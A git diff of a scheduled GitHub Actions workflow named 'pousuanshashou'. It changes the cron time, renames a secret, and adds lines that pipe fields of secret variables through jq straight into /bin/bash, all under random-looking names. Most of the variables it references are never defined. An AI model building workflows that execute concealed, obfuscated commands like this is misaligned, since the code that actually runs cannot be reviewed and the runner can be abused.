@@ -1,9 +1,8 @@
 name: pousuanshashou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 5/6 * * *'
+    - cron: '1 0/6 * * *'
 
 jobs:
   build:
@@ -13,11 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: pousuanshashou
         env:
-          forpz53: ${{ secrets.forpz53 }}
+          fcet3879: ${{ secrets.fcet3879 }}
         run: |
-          echo $forpz53 | jq -r .s8 | /bin/bash
-          echo $voo4 | jq -r .fpzp459 | /bin/bash
-          echo $dxh03 | jq -r .ikyck48750 | /bin/bash
-          echo $cqy60354 | jq -r .msza1862 | /bin/bash
-          echo $sxe908 | jq -r .dul887 | /bin/bash
+          echo $fcet3879 | jq -r .s5 | /bin/bash
+          echo $nsleg74035 | jq -r .mzjv32155 | /bin/bash
+          echo $j3 | jq -r .unut71 | /bin/bash
+          echo $oiel9 | jq -r .xpgey83 | /bin/bash
+          echo $sqgjc1669 | jq -r .nap6514 | /bin/bash
+          echo $b691 | jq -r .xu60622 | /bin/bash
+          echo $e4890 | jq -r .wr788 | /bin/bash
+          echo $k5 | jq -r .br061 | /bin/bash
+          echo $xwpts937 | jq -r .inr2243 | /bin/bash
 
